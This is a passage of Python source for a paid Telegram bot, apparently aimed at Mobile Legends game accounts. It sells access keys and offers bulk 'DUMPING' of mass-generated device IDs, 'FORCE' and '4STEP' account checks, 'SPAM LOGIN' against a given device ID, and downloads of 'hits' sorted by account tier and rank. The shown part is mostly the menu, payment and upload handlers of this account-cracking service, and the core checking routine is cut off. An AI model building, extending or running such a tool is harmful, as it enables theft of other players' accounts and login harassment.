            await _send_premium(update, "{skull} No active check.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return

        # INSTANT STOP — mark globally first
        _mark_stop(jid)
        job_set_state(jid, "stopped")

        # Also cancel any asyncio tasks for this user
        for task_attr in ("_live_stop", "_task_handle"):
            t = ctx.user_data.get(task_attr)
            if t and hasattr(t, "set"):
                try:
                    t.set()
                except Exception:
                    pass

        _st_txt, _st_ents = fmt_premium(
            "{nono} STOPPING INSTANTLY... {nono}\n"
            "{snow} Current threads will exit within ~3 seconds.")
        try:
            if _st_ents:
                await update.message.reply_text(
                    _st_txt, entities=_st_ents,
                    reply_markup=kb_main(uid in ADMIN_IDS))
            else:
                await update.message.reply_text(
                    _st_txt, reply_markup=kb_main(uid in ADMIN_IDS))
        except Exception:
            await update.message.reply_text(
                "STOPPING INSTANTLY...\nCurrent threads will exit within ~3 seconds.",
                reply_markup=kb_main(uid in ADMIN_IDS))
        return

    if text == "STOP GENERATE":
        jid = ctx.user_data.get("active_gen_job")
        if jid:
            gen_job_update(jid, state="stopped")
            await update.message.reply_text("Stopping generation...", reply_markup=kb_bulk())
        return

    if text == "\U0001F511 REDEEM KEY" or text == "REDEEM KEY":
        ctx.user_data["await_key"] = True
        ctx.user_data["menu"] = "redeem"
        _rk = (f"{{hot}} REDEEM KEY {{hot}}\n\n"
               f"{{mail}} Send your key\n"
               f"{{ok}} Format: OXIDE-XXXX-XXXX-XXXX")
        _rtxt, _rents = fmt_premium(_rk)
        try:
            if _rents:
                await update.message.reply_text(
                    _rtxt, entities=_rents, reply_markup=kb_redeem())
            else:
                await update.message.reply_text(
                    _rtxt, reply_markup=kb_redeem())
        except Exception:
            await update.message.reply_text(
                "REDEEM KEY\n\nSend your key.\nFormat: OXIDE-XXXX-XXXX-XXXX",
                reply_markup=kb_redeem())
        return

    if text == "\u2699\uFE0F MY ACCESS" or text == "MY ACCESS":
        summary = db_user_access_summary(uid)
        rem = access_remaining_seconds(uid)
        if rem is None:
            extra = "Status: ADMIN (unlimited)"
            _icon = "{crown}"
        elif rem > 0:
            extra = f"Status: ACTIVE ({_format_remaining(rem)} left)"
            _icon = "{battery}"
        else:
            extra = "Status: NO ACCESS"
            _icon = "{no_entry}"
        _ma = (f"{{gear}} MY ACCESS {{gear}}\n\n"
               f"{summary}\n\n"
               f"{_icon} {extra}")
        _matxt, _maents = fmt_premium(_ma)
        try:
            if _maents:
                await update.message.reply_text(
                    _matxt, entities=_maents,
                    reply_markup=kb_main(uid in ADMIN_IDS))
            else:
                await update.message.reply_text(
                    _matxt, reply_markup=kb_main(uid in ADMIN_IDS))
        except Exception:
            await update.message.reply_text(
                f"MY ACCESS\n\n{summary}\n\n{extra}",
                reply_markup=kb_main(uid in ADMIN_IDS))
        return

    if ctx.user_data.get("await_key"):
        ctx.user_data["await_key"] = False
        key = text.strip().upper()
        if not key:
            await _send_premium(update, "{cry} Empty key.", reply_markup=kb_redeem())
            return
        ok, result = db_bind_key(key, uid)
        if not ok:
            reasons = {"INVALID": "Invalid key.",
                       "ALREADY_BOUND": "This key is already bound to another user.",
                       "MAX_USES": "This key has reached its maximum uses."}
            await update.message.reply_text(reasons.get(result, "Failed to redeem."),
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return
        until = result
        ctx.user_data["menu"] = "main"
        _ka = (f"{{hot}} KEY ACTIVATED {{hot}}\n\n"
               f"{{ok}} Key: {key}\n"
               f"{{battery}} Expires: {format_timestamp_full(until)}\n\n"
               f"{{party}} Enjoy!")
        _katxt, _kaents = fmt_premium(_ka)
        try:
            if _kaents:
                await update.message.reply_text(
                    _katxt, entities=_kaents,
                    reply_markup=kb_main(uid in ADMIN_IDS))
            else:
                await update.message.reply_text(
                    _katxt, reply_markup=kb_main(uid in ADMIN_IDS))
        except Exception:
            await update.message.reply_text(
                f"KEY ACTIVATED\n\nKey: {key}\nExpires: {format_timestamp_full(until)}\n\nEnjoy!",
                reply_markup=kb_main(uid in ADMIN_IDS))
        _kr_txt, _kr_ents = fmt_premium(
            f"{{hot}} KEY REDEEMED {{hot}}\n"
            f"{{ok}} User: {uid} (@{db_get_username(uid)})\n"
            f"{{mail}} Key: {key}\n"
            f"{{battery}} Expires: {format_timestamp_full(until)}")
        for admin_id in ADMIN_IDS:
            try:
                if _kr_ents:
                    await ctx.application.bot.send_message(
                        chat_id=admin_id,
                        text=_kr_txt,
                        entities=_kr_ents)
                else:
                    await ctx.application.bot.send_message(
                        chat_id=admin_id,
                        text=_kr_txt)
            except Exception:
                pass
        return



    if text == "🎁 PLANS" or text == "PLANS":
        ctx.user_data["menu"] = "plans"
        _plans_lines = [
            "{diamond} SELECT PLAN {diamond}",
            "",
        ]
        for k, p in PLANS.items():
            _plans_lines.append(f"{{gift}} {k}. {p['name']} — {p['price']:,} MMK")
        _plans_lines.append("")
        _plans_lines.append("{question} Type plan number (1-4)")
        _plans_lines.append("{wave_pay} WAVE PAY  |  {kbz_pay} KBZ PAY")
        _plans_txt, _plans_ents = fmt_premium("\n".join(_plans_lines))
        try:
            if _plans_ents:
                await update.message.reply_text(_plans_txt, entities=_plans_ents,
                                                reply_markup=kb_plans())
            else:
                await update.message.reply_text(_plans_txt, reply_markup=kb_plans())
        except Exception:
            await update.message.reply_text(
                "SELECT PLAN\n\n" +
                "\n".join(f"{k}. {p['name']} — {p['price']:,} MMK" for k, p in PLANS.items()),
                reply_markup=kb_plans())
        return

    if text == "SELECT PLAN":
        _sp_lines = [
            "{diamond} SELECT PLAN {diamond}",
            "",
        ]
        for k, p in PLANS.items():
            _sp_lines.append(f"{{gift}} {k}. {p['name']} — {p['price']:,} MMK")
        _sp_lines.append("")
        _sp_lines.append("{question} Type plan number (1-4):")
        _sp_txt, _sp_ents = fmt_premium("\n".join(_sp_lines))
        try:
            if _sp_ents:
                await update.message.reply_text(_sp_txt, entities=_sp_ents)
            else:
                await update.message.reply_text(_sp_txt)
        except Exception:
            await update.message.reply_text("Type plan number 1-4")
        ctx.user_data["await_plan_choice"] = True
        return

    if ctx.user_data.get("await_plan_choice"):
        ctx.user_data["await_plan_choice"] = False
        _plan_key = text.strip()
        if _plan_key not in PLANS:
            _err_txt, _err_ents = fmt_premium("{poop} Invalid plan. Type 1-4.")
            if _err_ents:
                await update.message.reply_text(_err_txt, entities=_err_ents)
            else:
                await update.message.reply_text(_err_txt)
            return
        _plan = PLANS[_plan_key]
        ctx.user_data["selected_plan"] = _plan_key
        _pay_lines = [
            "{gift} PLAN SELECTED: " + _plan["name"],
            "",
            "{star} Duration: " + str(_plan["days"]) + " days",
            "{dice} Price: " + f"{_plan['price']:,} MMK",
            "",
            "{question} Choose payment method below:",
        ]
        _pay_txt, _pay_ents = fmt_premium("\n".join(_pay_lines))
        try:
            if _pay_ents:
                await update.message.reply_text(
                    _pay_txt, entities=_pay_ents,
                    reply_markup=kb_payment_methods(_plan_key))
            else:
                await update.message.reply_text(
                    _pay_txt, reply_markup=kb_payment_methods(_plan_key))
        except Exception:
            await update.message.reply_text(
                f"Plan: {_plan['name']}\nPrice: {_plan['price']:,} MMK",
                reply_markup=kb_payment_methods(_plan_key))
        return

    if text == "REFERRAL":
        ctx.user_data["menu"] = "referral"
        _ref_stats = db_get_referral_stats(uid)
        print(f"[REF] Display for user {uid}: {_ref_stats}")
        try:
            _bot_me = await ctx.bot.get_me()
            _bot_un = _bot_me.username
        except Exception:
            _bot_un = "your_bot"
        _ref_link = f"https://t.me/{_bot_un}?start=ref_{uid}"
        _avail = _ref_stats["checks_earned"] - _ref_stats["checks_used"]

        # Access status
        _access = has_access(uid)
        if uid in ADMIN_IDS:
            _acc_status = "👑 ADMIN (unlimited)"
        elif _access:
            _rem = access_remaining_seconds(uid)
            _acc_status = f"✅ ACTIVE ({_format_remaining(_rem)} left)"
        else:
            _acc_status = "❌ NO ACCESS"

        _ref_lines = [
            "{star2} MY REFERRALS {star2}",
            "",
            "{gift} Total Referrals: " + str(_ref_stats["total_referrals"]),
            "{star} Checks Earned: " + str(_ref_stats["checks_earned"]),
            "{dice} Checks Used: " + str(_ref_stats["checks_used"]),
            "{ok} Available: " + str(_avail),
            "",
            "{question} Your referral link:",
            _ref_link,
            "",
            "{battery} Current Status: " + _acc_status,
            "",
            "{arrow_up} Rules:",
            "• 1 refer = 1 FREE CHECKING",
            "• Credit works when trial/key EXPIRED",
            "• Credit is NOT used during active access",
        ]
        _ref_txt, _ref_ents = fmt_premium("\n".join(_ref_lines))
        try:
            if _ref_ents:
                await update.message.reply_text(
                    _ref_txt, entities=_ref_ents,
                    reply_markup=kb_referral())
            else:
                await update.message.reply_text(
                    _ref_txt, reply_markup=kb_referral())
        except Exception as e:
            print(f"[REF] error: {e}")
            await update.message.reply_text(
                f"Referrals: {_ref_stats['total_referrals']}\n"
                f"Earned: {_ref_stats['checks_earned']}\n"
                f"Used: {_ref_stats['checks_used']}",
                reply_markup=kb_referral())
        return

    if text == "MY REFERRALS":
        # Shortcut — same as REFERRAL
        ctx.user_data["menu"] = "referral"
        await update.message.reply_text(
            "Use REFERRAL button on main keyboard.",
            reply_markup=kb_main(uid in ADMIN_IDS))
        return

    if text == "❓ HELP" or text == "HELP":
        _help_txt = (f"{{shield}} {BOT_NAME} BOT\n"
                     f"DEVELOPER - {DEVELOPER}\n"
                     f"DEV - {DEV_TAG}\n\n"
                     f"{{hand}} You must join BOTH channels:\n"
                     + "\n".join(f"  - {ch['url']}" for ch in FORCE_CHANNELS) +
                     "\n\n"
                     f"{{medal}} FORCE CHECK / 4STEP CHECK / SINGLE CHECK\n"
                     f"{{star}} DUMPING / SPAM LOGIN / FILES / STATISTICS\n\n"
                     f"{{sun}} KEY SYSTEM:\n"
                     f"  - New users get {TRIAL_DAYS} days FREE TRIAL\n"
                     f"  - REDEEM KEY to extend access\n"
                     f"  - MY ACCESS to view status\n"
                     f"  - Buy keys: {BUY_CONTACT}")
        _h_txt, _h_ents = fmt_premium(_help_txt)
        try:
            if _h_ents:
                await update.message.reply_text(
                    _h_txt, entities=_h_ents, reply_markup=kb_main(uid in ADMIN_IDS))
            else:
                await update.message.reply_text(
                    _h_txt, reply_markup=kb_main(uid in ADMIN_IDS))
        except Exception as e:
            print(f"[PREMIUM] HELP fail: {type(e).__name__}: {e}")
            await update.message.reply_text(
                _help_txt, reply_markup=kb_main(uid in ADMIN_IDS))
        return

    # ---- REFERRAL CREDIT CONSUMPTION ----
    # Only consume when trial/key EXPIRED and user HAS credit
    _checking_commands = {
        "FORCE CHECK", "\U0001F6E1 FORCE CHECK",
        "4STEP CHECK", "\U0001F451 4STEP CHECK",
        "SINGLE CHECK", "\u2B50 SINGLE CHECK",
        "DUMPING", "\U0001F396 DUMPING",
        "SPAM LOGIN", "\u26D4 SPAM LOGIN",
    }
    if text in _checking_commands:
        if _should_use_referral_credit(uid):
            if _consume_one_credit(uid):
                _stats = db_get_referral_stats(uid)
                _avail = _stats["checks_earned"] - _stats["checks_used"]
                _cc_txt, _cc_ents = fmt_premium(
                    f"{{gift}} REFERRAL CREDIT USED\n"
                    f"{{dice}} 1 credit consumed\n"
                    f"{{ok}} Remaining: {_avail}")
                try:
                    if _cc_ents:
                        await update.message.reply_text(_cc_txt, entities=_cc_ents)
                    else:
                        await update.message.reply_text(_cc_txt)
                except Exception:
                    pass
                print(f"[REF] User {uid} consumed 1 credit ({_avail} left)")

    if text == "\U0001F6E1 FORCE CHECK" or text == "FORCE CHECK":
        ctx.user_data["menu"] = "4step"
        ctx.user_data["force_mode"] = True
        await _send_premium(update, "{shield} FORCE CHECK {shield}\n\n{mail} Upload a .txt file.",
                                        reply_markup=kb_4step())
        return

    if text == "\U0001F451 4STEP CHECK" or text == "4STEP CHECK":
        ctx.user_data["menu"] = "4step"
        ctx.user_data["force_mode"] = False
        await _send_premium(update, "{crown} 4STEP CHECK {crown}\n\n{mail} Upload a .txt file.",
                                        reply_markup=kb_4step())
        return

    if text == "\u2B50 SINGLE CHECK" or text == "SINGLE CHECK":
        ctx.user_data["menu"] = "single"
        ctx.user_data["await_single"] = True
        await _send_premium(update,
            "{star} SINGLE CHECK {star}\n\n{hand} Send one Device ID (e.g. and_xxxxxx)",
            reply_markup=kb_single())
        return

    if text == "\u26D4 SPAM LOGIN" or text == "SPAM LOGIN":
        ctx.user_data["menu"] = "spam"
        await _send_premium(update,
            "{nono} SPAM LOGIN {nono}\n\n{dizzy2} Press START SPAM, then send Device ID.",
            reply_markup=kb_spam())
        return

    if text == "\U0001F396 DUMPING" or text == "DUMPING":
        ctx.user_data["menu"] = "bulk"
        await _send_premium(
            update,
            "{hot} DUMPING {hot}\n\n"
            "{mail} UPLOAD DEVICE IDS\n"
            "{fire} GENERATE DEVICE IDS\n\n"
            "{ok} Only VALID CHECK is used.",
            reply_markup=kb_bulk())
        return

    if text == "\U0001F4E3 FILES" or text == "FILES":
        ctx.user_data["menu"] = "files"
        await _send_premium(update, "{screen} FILES {screen}", reply_markup=kb_files())
        return

    if text == "\U0001F389 STATISTICS" or text == "STATISTICS":
        ctx.user_data["menu"] = "stats"
        await _send_premium(update, "{party} STATISTICS {party}", reply_markup=kb_stats())
        return

    if menu == "bulk":
        if text == "\U0001F4E4 UPLOAD DEVICE IDS" or text == "UPLOAD DEVICE IDS":
            ctx.user_data["await_bulk_file"] = True
            await _send_premium(update, "{mail} Send a .txt file of Device IDs.",
                                            reply_markup=kb_cancel())
            return
        if text == "\u2728 GENERATE DEVICE IDS" or text == "GENERATE DEVICE IDS":
            ctx.user_data["menu"] = "bulk_gen"
            ctx.user_data["await_gen_count"] = True
            await _send_premium(update,
                "{fire} GENERATE DEVICE IDS {fire}\n\n"
                "{ok} Send the number of IDs to generate\n"
                "{hot} (Valid Check will start automatically after generation)",
                reply_markup=kb_cancel())
            return

    # ============== BULK GENERATE — AUTO START DUMPING ==============
    if menu == "bulk_gen":
        if text == "STOP GENERATE":
            jid = ctx.user_data.get("active_gen_job")
            if jid:
                gen_job_update(jid, state="stopped")
                await update.message.reply_text("Stopping...", reply_markup=kb_bulk())
            return

        if ctx.user_data.get("await_gen_count"):
            ctx.user_data["await_gen_count"] = False
            try:
                n = int(text.replace(",", "").replace("_", "").strip())
                if n <= 0:
                    raise ValueError
            except ValueError:
                await _send_premium(update, "{cry} Invalid number.", reply_markup=kb_cancel())
                return
            if n > GEN_MAX_UNLIMITED:
                await update.message.reply_text(f"Max {GEN_MAX_UNLIMITED:,} per request.",
                                                reply_markup=kb_cancel())
                return

            # ---- Show "generating" status ----
            await _send_premium(
                update,
                f"{{fire}} GENERATING {n:,} DEVICE IDs... {{fire}}\n\n"
                f"{{ok}} Please wait, this may take a moment.",
                reply_markup=kb_gen_running()
            )

            # ---- Generate in thread ----
            def _gen_all():
                g = MLBBDeviceIDGenerator()
                return g.generate_smart(n)

            try:
                ids = await asyncio.to_thread(_gen_all)
            except Exception as e:
                await update.message.reply_text(
                    f"❌ Generation failed: {type(e).__name__}",
                    reply_markup=kb_bulk()
                )
                return

            if not ids:
                await update.message.reply_text(
                    "❌ No IDs generated.",
                    reply_markup=kb_bulk()
                )
                return

            parsed = [{"Device id": d, "role_id": None, "zone_id": None} for d in ids]

            # ---- Notify + Auto-start DUMPING ----
            await _send_premium(
                update,
                f"{{ok}} GENERATED {len(parsed):,} DEVICE IDs {{ok}}\n\n"
                f"{{fire}} AUTO-STARTING VALID CHECK (DUMPING)...\n\n"
                f"{{thumbsup}} PAUSE / RESUME / STOP available.",
                reply_markup=kb_check_running()
            )

            ctx.user_data["menu"] = "checking"
            asyncio.create_task(run_dumping_task(chat_id, ctx, uid, parsed))
            return
    # ================================================================

    if menu == "tier_select":
        await handle_tier_selection_text(update, ctx, uid, text)
        return

    if menu == "4step":
        if text == "\U0001F4C1 UPLOAD FILE" or text == "UPLOAD FILE":
            ctx.user_data["await_file"] = True
            await _send_premium(update, "{mail} Send .txt file now.", reply_markup=kb_cancel())
            return
        if text == "\u270F\uFE0F PASTE MANUAL" or text == "PASTE MANUAL":
            ctx.user_data["await_paste"] = True
            await _send_premium(update,
                "{mail} Paste lines:\n"
                "{ok} Device id: and_xxx | account id: 123 | zone id: 456",
                reply_markup=kb_cancel())
            return
        if ctx.user_data.get("await_paste"):
            cleaned, stats = clean_device_ids_from_text(text, keep_only_ids=False)
            if not cleaned:
                await _send_premium(update, "{cry} No valid Device ID.", reply_markup=kb_cancel())
                return
            ctx.user_data["await_paste"] = False
            existing = ctx.user_data.get("pending_accounts") or []
            seen = {a.get("device") for a in existing if a.get("device")}
            for item in cleaned:
                dev = item.get("device")
                if dev and dev not in seen:
                    existing.append(item)
                    seen.add(dev)
            ctx.user_data["pending_accounts"] = existing
            ctx.user_data["clean_stats"] = stats
            ctx.user_data["menu"] = "4step_confirm"
            await _send_premium(
                update,
                f"{{thumbsup}} Loaded {stats['unique']} entries\n"
                f"{{globe}} Total pending: {len(existing)}\n\n"
                f"{{ok}} Type CONFIRM START, ADD MORE IDS, or CANCEL.",
                reply_markup=kb_confirm_start())
            return

    if text == "ADD MORE IDS":
        if not ctx.user_data.get("pending_accounts"):
            await _send_premium(update, "{dizzy2} No pending IDs.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return
        ctx.user_data["menu"] = "4step"
        ctx.user_data["await_paste"] = True
        await _send_premium(update,
            "{mail} ADD MORE IDS {mail}\n\n{ok} Paste lines or send .txt file.",
            reply_markup=kb_cancel())
        return

    if text == "CONFIRM START":
        accounts = ctx.user_data.get("pending_accounts")
        if not accounts:
            await _send_premium(update, "{dizzy2} Nothing to confirm.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return
        parsed = []
        for item in accounts:
            parsed.append({
                "Device id": item.get("device"),
                "role_id": int(item.get("role_id")) if item.get("role_id") else None,
                "zone_id": int(item.get("zone_id")) if item.get("zone_id") else None,
            })
        current_menu = ctx.user_data.get("menu", "")
        is_bulk = current_menu in ("bulk_confirm", "bulk", "bulk_gen")
        is_force = ctx.user_data.get("force_mode", False)
        ctx.user_data["menu"] = "checking"
        if is_bulk:
            await _send_premium(
                update,
                f"{{fire}} DUMPING STARTED on {len(parsed)} entries {{fire}}\n"
                f"{{ok}} Live status will appear shortly.",
                reply_markup=kb_check_running())
            asyncio.create_task(run_dumping_task(chat_id, ctx, uid, parsed))
        elif is_force:
            await _send_premium(
                update,
                f"{{fire}} FORCE CHECK STARTED on {len(parsed)} entries {{fire}}\n"
                f"{{ok}} Live status will appear shortly.",
                reply_markup=kb_check_running())
            asyncio.create_task(run_force_task(chat_id, ctx, uid, parsed))
        else:
            await _send_premium(
                update,
                f"{{fire}} 4STEP CHECK STARTED on {len(parsed)} entries {{fire}}\n"
                f"{{ok}} Live status will appear shortly.",
                reply_markup=kb_check_running())
            asyncio.create_task(run_4step_task(chat_id, ctx, uid, parsed))
        ctx.user_data.pop("pending_accounts", None)
        ctx.user_data.pop("clean_stats", None)
        ctx.user_data["force_mode"] = False
        return

    if ctx.user_data.get("await_single"):
        if not text.startswith(("and_", "ios_")):
            await _send_premium(update, "{cry} Invalid Device ID.", reply_markup=kb_single())
            return
        ctx.user_data["await_single"] = False
        await _send_premium(
            update,
            "{fire} Checking... (ban + info) {fire}",
            reply_markup=kb_back_only())
        ok, result = await asyncio.to_thread(do_single_check_full, uid, text)
        if not ok:
            await update.message.reply_text(f"Failed: {result}", reply_markup=kb_single())
            return
        try:
            await send_result_by_tier(chat_id, ctx, uid, result, source="single")
        except Exception as e:
            import traceback
            traceback.print_exc()
            try:
                pd = result.get("pd", {})
                await update.message.reply_text(
                    f"Result:\nName: {pd.get('nickname', 'N/A')}\n"
                    f"Tier: {pd.get('collector_tier', 'No Tier')}\n"
                    f"BANNED: {'TRUE' if result.get('banned') else 'FALSE'}",
                    reply_markup=kb_main(uid in ADMIN_IDS))
            except Exception:
                pass
        return

    if menu == "spam":
        if text == "\u25B6\uFE0F START SPAM" or text == "START SPAM":
            ctx.user_data["await_spam_device"] = True
            await update.message.reply_text("Send Device ID to spam.", reply_markup=kb_cancel())
            return
        if ctx.user_data.get("await_spam_device"):
            if not text.startswith(("and_", "ios_")):
                await _send_premium(update, "{cry} Invalid Device ID.", reply_markup=kb_cancel())
                return
            ctx.user_data["await_spam_device"] = False
            ctx.user_data["spam_running"] = True
            ctx.user_data["spam_device"] = text
            asyncio.create_task(spam_loop(chat_id, ctx, uid, text))
            await _send_premium(
                update,
                f"{{fire}} Spam started for {text}\n"
                f"{{ok}} Press STOP SPAM to stop.",
                reply_markup=kb_spam())
            return

    if menu == "files":
        if text == "\U0001F4CB LIST HITS" or text == "LIST HITS":
            await send_hits_list(update, ctx, uid)
            return
        if text == "\U0001F4E5 DOWNLOAD ALL HITS" or text == "DOWNLOAD ALL HITS":
            await send_hits_file(update, ctx, uid)
            return
        if text == "\U0001F4CA TIER BREAKDOWN IMAGE" or text == "TIER BREAKDOWN IMAGE":
            await send_user_tier_image(update, ctx, uid)
            return
        if text == "\U0001F451 RANK BREAKDOWN IMAGE" or text == "RANK BREAKDOWN IMAGE":
            await send_user_rank_image(update, ctx, uid)
            return
        if text == "\U0001F4C2 SELECT TIER FILES" or text == "SELECT TIER FILES":
            await start_tier_selection(update, ctx, uid)
            return
        if text == "\U0001F4E6 DOWNLOAD ALL TIER FILES" or text == "DOWNLOAD ALL TIER FILES":
            await send_tier_zip_all(update, ctx, uid)
            return
        if text == "\U0001F5D1 DELETE HIT BY ID" or text == "DELETE HIT BY ID":
            ctx.user_data["await_delete_id"] = True
            await _send_premium(update, "{wrench} Send hit ID to delete.", reply_markup=kb_cancel())
            return
        if text == "\u26A0\uFE0F CLEAR ALL HITS" or text == "CLEAR ALL HITS":
            await _send_premium(update,
                "{angry} Delete ALL your hits? Type CONFIRM_CLEAR.",
                reply_markup=kb_confirm_clear())
            return
        if ctx.user_data.get("await_delete_id"):
            ctx.user_data["await_delete_id"] = False
            try:
                hid = int(text.strip())
            except ValueError:
                await _send_premium(update, "{cry} Invalid ID.", reply_markup=kb_files())
                return
            db_delete_hit(hid, uid)
            await update.message.reply_text(f"Deleted hit #{hid}.", reply_markup=kb_files())
            return

    if text == "CONFIRM_CLEAR":
        db_clear_user_hits(uid)
        await update.message.reply_text("All your hits cleared.", reply_markup=kb_files())
        return

    if menu == "stats":
        if text == "\U0001F396 TIER BREAKDOWN" or text == "TIER BREAKDOWN":
            await send_user_tier_image(update, ctx, uid)
            return
        if text == "\U0001F451 RANK BREAKDOWN" or text == "RANK BREAKDOWN":
            await send_user_rank_image(update, ctx, uid)
            return
        if text == "\U0001F6E1 V2L BREAKDOWN" or text == "V2L BREAKDOWN":
            await send_v2l_breakdown(update, ctx, uid)
            return
        if text == "\u23F0 OFFLINE BREAKDOWN" or text == "OFFLINE BREAKDOWN":
            await send_offline_breakdown_stats(update, ctx, uid)
            return
        if text == "\U0001F4CA FULL SUMMARY IMAGE" or text == "FULL SUMMARY IMAGE":
            await send_user_full_image(update, ctx, uid)
            return

    await _send_premium(update, "{cry} Unknown command.",
                                    reply_markup=kb_main(uid in ADMIN_IDS))


# ======================================================================
#  DOCUMENT HANDLER
# ======================================================================
async def on_document(update: Update, ctx):
    if not update.effective_user or not update.message:
        return
    uid = update.effective_user.id
    db_ensure_user(uid, update.effective_user.username or "")
    if db_is_banned(uid):
        return
    try:
        if not await _enforce_force_join(update, ctx):
            return
    except Exception as e:
        print(f"[on_document] force_join fail: {type(e).__name__}: {e}")
        return
    if (uid not in ADMIN_IDS) and (not has_access(uid)):
        _na_txt, _na_ents = fmt_premium(NEED_ACCESS_MSG)
        if _na_ents:
            await update.message.reply_text(_na_txt, entities=_na_ents,
                                            reply_markup=kb_main(False))
        else:
            await update.message.reply_text(_na_txt, reply_markup=kb_main(False))
        return

    if ctx.user_data.get("await_payment_screenshot"):
        ctx.user_data["await_payment_screenshot"] = False
        plan_key = ctx.user_data.get("selected_plan")
        pay_method = ctx.user_data.get("selected_pay_method", "WAVE PAY")
        if not plan_key or plan_key not in PLANS:
            await _send_premium(update, "{poop} Session expired. Please /start again.")
            return
        doc = update.message.document if update.message else None
        photo = update.message.photo[-1] if (update.message and update.message.photo) else None
        if not doc and not photo:
            await _send_premium(update, "{poop} Please send payment screenshot.")
            return
        file_id = doc.file_id if doc else photo.file_id

        payment_id = db_create_pending_payment(uid, plan_key, pay_method, file_id)
        if not payment_id:
            await _send_premium(update, "{poop} Failed to create payment record.")
            return

        _wait_lines = [
            "{battery} WAIT FOR ADMIN APPROVE",
            "",
            "{ok} Payment ID: #" + str(payment_id),
            "{star} Plan: " + PLANS[plan_key]["name"],
            "{dice} Price: " + f"{PLANS[plan_key]['price']:,} MMK",
            "",
            "{question} Admin will review shortly.",
        ]
        _wait_txt, _wait_ents = fmt_premium("\n".join(_wait_lines))
        try:
            if _wait_ents:
                await update.message.reply_text(_wait_txt, entities=_wait_ents)
            else:
                await update.message.reply_text(_wait_txt)
        except Exception:
            await update.message.reply_text(f"WAIT FOR ADMIN APPROVE (#{payment_id})")

        _adm_lines = [
            "{gift} NEW PAYMENT REQUEST {gift}",
            "",
            "{ok} Payment ID: #" + str(payment_id),
            "{question} User: " + f"{uid} (@{db_get_username(uid)})",
            "{star} Plan: " + PLANS[plan_key]["name"] + f" ({PLANS[plan_key]['days']} days)",
            "{dice} Price: " + f"{PLANS[plan_key]['price']:,} MMK",
            "{arrow_up} Method: " + pay_method,
        ]
        _adm_txt, _adm_ents = fmt_premium("\n".join(_adm_lines))
        for admin_id in ADMIN_IDS:
            try:
                if doc:
                    await ctx.bot.send_document(
                        chat_id=admin_id, document=file_id,
                        caption=_adm_txt,
                        caption_entities=_adm_ents if _adm_ents else None,
                        reply_markup=kb_admin_payment_review(payment_id))
                else:
                    await ctx.bot.send_photo(
                        chat_id=admin_id, photo=file_id,
                        caption=_adm_txt,
                        caption_entities=_adm_ents if _adm_ents else None,
                        reply_markup=kb_admin_payment_review(payment_id))
            except Exception as e:
                print(f"[PAY] admin notify fail: {e}")

        ctx.user_data.pop("selected_plan", None)
        ctx.user_data.pop("selected_pay_method", None)
        return

    if ctx.user_data.get("await_bulk_file"):
        ctx.user_data["await_bulk_file"] = False
        doc = update.message.document if update.message else None
        if not doc:
            await _send_premium(update, "{cry} No document found.", reply_markup=kb_cancel())
            return
        fname = (doc.file_name or "").strip()
        if not fname.lower().endswith(".txt"):
            await _send_premium(update, "{nono} Only .txt files accepted.",
                                            reply_markup=kb_cancel())
            return
        user_dir = USERS_DIR / str(uid)
        user_dir.mkdir(exist_ok=True, parents=True)
        input_fp = user_dir / f"bulk_input_{int(time.time())}.txt"
        try:
            f = await doc.get_file()
            await f.download_to_drive(str(input_fp))
        except Exception as e:
            await _send_premium(update, f"{{skull}} Download failed: {type(e).__name__}",
                                            reply_markup=kb_cancel())
            return
        try:
            content = input_fp.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            await _send_premium(update, "{skull} Failed to read file.", reply_markup=kb_cancel())
            try:
                os.remove(input_fp)
            except Exception:
                pass
            return
        cleaned, stats = clean_device_ids_from_text(content, keep_only_ids=False)
        try:
            os.remove(input_fp)
        except Exception:
            pass
        if not cleaned:
            await _send_premium(update, "{cry} No valid Device ID.", reply_markup=kb_cancel())
            return
        ctx.user_data["pending_accounts"] = cleaned
        ctx.user_data["clean_stats"] = stats
        ctx.user_data["menu"] = "bulk_confirm"
        await _send_premium(
            update,
            f"{{fire}} DUMPING FILE LOADED {{fire}}\n\n"
            f"{{thumbsup}} Unique: {stats['unique']}\n\n"
            f"{{ok}} Type CONFIRM START, ADD MORE IDS, or CANCEL.",
            reply_markup=kb_confirm_start())
        return

    if ctx.user_data.get("await_file") or ctx.user_data.get("menu") == "4step":
        doc = update.message.document if update.message else None
        if not doc:
            if ctx.user_data.get("await_file"):
                await _send_premium(update, "{cry} No document found.", reply_markup=kb_cancel())
            return
        fname = (doc.file_name or "").strip()
        if not fname:
            await _send_premium(update, "{cry} File has no name.", reply_markup=kb_cancel())
            return
        if not fname.lower().endswith(".txt"):
            await _send_premium(update, "{nono} Only .txt files accepted.",
                                            reply_markup=kb_cancel())
            return
        user_dir = USERS_DIR / str(uid)
        user_dir.mkdir(exist_ok=True, parents=True)
        input_fp = user_dir / f"input_{int(time.time())}.txt"
        try:
            f = await doc.get_file()
            await f.download_to_drive(str(input_fp))
        except Exception as e:
            await _send_premium(update, f"{{skull}} Download failed: {type(e).__name__}",
                                            reply_markup=kb_cancel())
            return
        try:
            content = input_fp.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            await _send_premium(update, "{skull} Failed to read file.", reply_markup=kb_cancel())
            try:
                os.remove(input_fp)
            except Exception:
                pass
            return
        cleaned, stats = clean_device_ids_from_text(content, keep_only_ids=False)
        if not cleaned:
            await _send_premium(update, "{cry} No valid Device ID.", reply_markup=kb_cancel())
            try:
                os.remove(input_fp)
            except Exception:
                pass
            return
        existing = ctx.user_data.get("pending_accounts") or []
        seen_devices = {a.get("device") for a in existing if a.get("device")}
        added = 0
        for item in cleaned:
            dev = item.get("device")
            if dev and dev not in seen_devices:
                existing.append(item)
                seen_devices.add(dev)
                added += 1
        ctx.user_data["await_file"] = False
        ctx.user_data["pending_accounts"] = existing
        ctx.user_data["clean_stats"] = stats
        ctx.user_data["menu"] = "4step_confirm"
        try:
            os.remove(input_fp)
        except Exception:
            pass
        await _send_premium(
            update,
            f"{{party}} Loaded {stats['unique']} entries. Added: {added}\n"
            f"{{globe}} Total pending: {len(existing)}\n\n"
            f"{{ok}} Type CONFIRM START, ADD MORE IDS, or CANCEL.",
            reply_markup=kb_confirm_start())
        return


# ======================================================================
#  SINGLE CHECK (MmspCore style)
# ======================================================================
def do_single_check_full(uid, device_id):
    try:
        # Step 1: quick ban check
        banned_status = False
        try:
